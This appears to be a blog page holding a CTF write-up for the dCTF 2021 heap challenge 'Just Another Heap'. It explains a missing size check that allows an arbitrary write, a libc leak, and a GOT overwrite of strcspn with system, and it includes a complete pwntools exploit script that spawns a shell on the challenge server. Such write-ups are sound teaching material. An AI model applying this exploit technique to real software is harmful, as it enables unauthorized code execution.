@@ -1,0 +1,381 @@
+<!doctype html>
+<html lang="en" data-theme="auto">
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src 'self' data: https://pbs.twimg.com https://abs.twimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdn.jsdelivr.net; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net data:; script-src 'self' https://cdn.jsdelivr.net https://platform.twitter.com; connect-src 'self' https://platform.twitter.com https://syndication.twitter.com https://cdn.syndication.twimg.com https://nitter.net; frame-src https://platform.twitter.com https://syndication.twitter.com https://nitter.net; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'; upgrade-insecure-requests">
+<title>2021 dctf write-up | st4rlight</title>
+<meta name="description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.">
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="alternate" type="application/atom+xml" title="st4rlight Feed" href="/feed.xml">
+<link rel="icon" href="/assets/img/og-default.svg">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500;600&display=swap">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>2021 dctf write-up | st4rlight</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="2021 dctf write-up" />
+<meta name="author" content="st4rlight" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways." />
+<meta property="og:description" content="CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways." />
+<link rel="canonical" href="https://st4rlight.github.io/research/2021/05/17/dctf_2021_just_another_heap/" />
+<meta property="og:url" content="https://st4rlight.github.io/research/2021/05/17/dctf_2021_just_another_heap/" />
+<meta property="og:site_name" content="st4rlight" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-17T19:18:39+09:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="2021 dctf write-up" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"st4rlight"},"dateModified":"2021-05-17T19:18:39+09:00","datePublished":"2021-05-17T19:18:39+09:00","description":"CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.","headline":"2021 dctf write-up","mainEntityOfPage":{"@type":"WebPage","@id":"https://st4rlight.github.io/research/2021/05/17/dctf_2021_just_another_heap/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://st4rlight.github.io/assets/img/og-default.svg"},"name":"st4rlight"},"url":"https://st4rlight.github.io/research/2021/05/17/dctf_2021_just_another_heap/"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  </head>
+  <body data-line-numbers="true">
+    <a class="skip-link" href="#main-content">Skip to content</a>
+    <header class="site-header">
+  <div class="shell header-shell">
+    <a class="brand" href="/" aria-label="Go to home">
+      <span class="brand-mark">Hacky</span>
+      <span class="brand-text">Life &amp; Writeup</span>
+    </a>
+    <nav class="main-nav" aria-label="Primary">
+      <button class="nav-toggle" type="button" aria-expanded="false" aria-controls="menu-list">Menu</button>
+      <ul id="menu-list">
+        
+          
+          
+          
+            <li><a href="/" >Home</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/about/" >About</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/timeline/" >Timeline</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/posts/" >Posts</a></li>
+          
+        
+          
+          
+          
+            <li><a href="/search/" >Search</a></li>
+          
+        
+      </ul>
+    </nav>
+    <button id="theme-toggle" class="theme-toggle" type="button" aria-label="Toggle color theme">Theme</button>
+  </div>
+</header>
+
+    <main id="main-content" class="site-main">
+      <article class="shell post-shell" itemscope itemtype="https://schema.org/Article">
+  <header class="post-header">
+    <p class="eyebrow">ctf</p>
+    <h1 itemprop="headline">2021 dctf write-up</h1>
+    <p class="post-description" itemprop="description">CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+    <p class="post-meta">
+      <time datetime="2021-05-17T19:18:39+09:00" itemprop="datePublished">2021-05-17</time>
+      <span> · updated 2021-05-17</span>
+      
+    </p>
+    
+      <ul class="chip-list">
+        
+          <li><a href="/tags/#tag-research">#research</a></li>
+        
+          <li><a href="/tags/#tag-ctf">#ctf</a></li>
+        
+          <li><a href="/tags/#tag-writeup">#writeup</a></li>
+        
+      </ul>
+    
+    
+  </header>
+
+  <div class="post-body-wrap">
+    <div class="post-content js-article" itemprop="articleBody">
+      <h2 id="tasks">Tasks</h2>
+
+<ul>
+  <li>Pwn💻
+    <ul>
+      <li>Just Another Heap (500pts)</li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="just-another-heap-500pts">Just Another Heap (500pts)</h2>
+
+<p>I couldn’t solve this one prob in time, but I want to post this solving skills. It’s hard to find, but when I found it, It’s very simple Arbitrary Write.</p>
+
+<p><img src="/assets/img/legacy/2021-dctf/1.png" alt="1.png" /></p>
+
+<ul>
+  <li>It has 5 user functions(create, relive, forget, change, listing).</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">create()</code> has a role that makes malloc_frame(0x20) and  malloc_userinput(size).<br />
+The point is, this prob has a unique fading input with this part.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">puts</span><span class="p">(</span><span class="s">"How long is your memory"</span><span class="p">);</span>
+<span class="n">input_lu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>                          <span class="c1">// no size check</span>
+<span class="n">malloc_user</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>               <span class="c1">// size &gt; 0x308 / forget -&gt; unsorted bin</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"Sometimes our memories fade and we only remember parts of them."</span><span class="p">);</span>
+<span class="n">input_lu</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fade</span><span class="p">);</span>                          <span class="c1">// no filter</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">"Would you like to leave some space at the beginning in case you remember later?"</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span> <span class="n">fade</span> <span class="o">&lt;=</span> <span class="n">size</span> <span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">malloc_user</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">fade</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+      <span class="n">malloc_user</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'_'</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">malloc_user</span> <span class="o">+=</span> <span class="n">fade</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>memories will be faded <code class="language-plaintext highlighter-rouge">fade</code> bytes with <code class="language-plaintext highlighter-rouge">_</code>, and user input is behind the <code class="language-plaintext highlighter-rouge">_</code> strings if malloc_user is NOT 0.<br />
+So, if <code class="language-plaintext highlighter-rouge">malloc(size)</code> returns <code class="language-plaintext highlighter-rouge">0</code>, I can overwrite anywhere.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>First, set chunks that <code class="language-plaintext highlighter-rouge">size&gt;0x408</code> between 2 small chunks<br />
+to leak libc from <code class="language-plaintext highlighter-rouge">main_arena+xx</code>.</p>
+
+<p>And make 1 tcache and <code class="language-plaintext highlighter-rouge">0x410</code> unsorted bin. Now <code class="language-plaintext highlighter-rouge">main_arena+xx</code> has written in unsorted bin.</p>
+
+<p>and if I rewrite and use <code class="language-plaintext highlighter-rouge">change()</code> to fill fade bytes and get libc addr with <code class="language-plaintext highlighter-rouge">relive()</code> function.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">change()</code> function : overwrite from the beginning or behind fade <code class="language-plaintext highlighter-rouge">_</code> strings</li>
+  <li><code class="language-plaintext highlighter-rouge">relive()</code> function : print user input with fade <code class="language-plaintext highlighter-rouge">_</code> string</li>
+</ul>
+
+<p>Finally, Use This mentioned skills to do GOT Overwriting.</p>
+
+<blockquote>
+  <p>memories will be faded <code class="language-plaintext highlighter-rouge">fade</code> bytes with <code class="language-plaintext highlighter-rouge">_</code>, and user input is behind the <code class="language-plaintext highlighter-rouge">_</code> strings<br />
+if malloc_user is NOT 0.<br />
+So, if <code class="language-plaintext highlighter-rouge">malloc(size)</code> returns <code class="language-plaintext highlighter-rouge">0</code>, I can overwrite anywhere.</p>
+</blockquote>
+
+<p>input <code class="language-plaintext highlighter-rouge">/bin/sh\x00</code> in malloc_frame[] and program will call <code class="language-plaintext highlighter-rouge">strcspn(addr,'\n')</code>. Get The Shell.</p>
+
+<h3 id="code">Code</h3>
+
+<p>Here is the Exploit Code.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span><span class="o">=</span><span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
+
+<span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">hide</span><span class="p">,</span> <span class="n">cont</span><span class="p">,</span> <span class="n">important</span><span class="p">,</span> <span class="n">recent</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">hide</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">important</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">recent</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">relive</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">cont</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">Y</span><span class="sh">"</span><span class="p">)</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">cont</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">forget</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">listing</span><span class="p">():</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+  <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span>
+
+<span class="n">p</span><span class="o">=</span><span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">dctf-chall-just-another-heap.westeurope.azurecontainer.io</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7481</span><span class="p">)</span>
+<span class="c1">#p=process("./just_another_heap")
+</span><span class="n">e</span><span class="o">=</span><span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./just_another_heap</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">l</span><span class="o">=</span><span class="n">e</span><span class="p">.</span><span class="n">libc</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">create</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">1234</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">forget</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="nf">forget</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="c1">#pause()
+</span><span class="nf">create</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="sh">"</span><span class="s">B</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="sh">""</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="c1">#pause()
+</span><span class="nf">change</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="nf">relive</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span><span class="o">*</span><span class="mi">7</span><span class="o">+</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">).</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span><span class="o">-</span><span class="mh">0x3ebca0</span>
+
+<span class="k">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
+
+<span class="nf">create</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sh">"</span><span class="s">C</span><span class="sh">"</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">strcspn</span><span class="sh">'</span><span class="p">],</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]),</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">N</span><span class="sh">"</span><span class="p">)</span>
+<span class="nf">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">"</span><span class="s">//bin/sh</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+    </div>
+    
+      <aside class="toc-shell js-toc-shell" aria-label="Table of contents">
+        <button class="toc-toggle" type="button" aria-expanded="false" aria-controls="toc-list">On this page</button>
+        <nav id="toc-list" class="js-toc"></nav>
+      </aside>
+    
+  </div>
+
+  
+
+  
+
+
+
+<section class="related-posts">
+  <h2>Related</h2>
+  <div class="card-grid">
+    
+      <article class="post-card">
+  <h3><a href="/research/2024/07/19/ctf_test/">CTF Write-up [test]</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2024-07-19</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+      <article class="post-card">
+  <h3><a href="/research/2022/07/18/htb_businessctf_2022/">HTB Business CTF 2022 : Dirty Money write-up (in progress)</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2022-07-18</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+      <article class="post-card">
+  <h3><a href="/research/2021/07/13/redpwn_2021_rev_web/">2021 redpwnCTF write-up</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2021-07-13</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+        <li><a href="/tags/#tag-web">#web</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+  </div>
+</section>
+
+
+
+  
+  
+</article>
+
+    </main>
+    <footer class="site-footer">
+  <div class="shell footer-shell">
+    <p>be the special st4rlight in the world</p>
+    <ul class="footer-links">
+      
+        
+        
+        
+          <li><a href="https://github.com/st4rlight">GitHub</a></li>
+        
+      
+        
+        
+        
+          <li><a href="mailto:bww9643@gmail.com">Email</a></li>
+        
+      
+        
+        
+        
+          <li><a href="https://ainsetin.notion.site/Ainsetin-s-Write-up-c1a0fb95760b41508d54ce94dc3601c5">Notion</a></li>
+        
+      
+    </ul>
+  </div>
+</footer>
+
+
+    
+      <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js" defer></script>
+    
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js" defer></script>
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js" defer></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/lib/common.min.js" defer></script>
+    <script src="/assets/js/main.js" defer></script>
+  </body>
+</html>
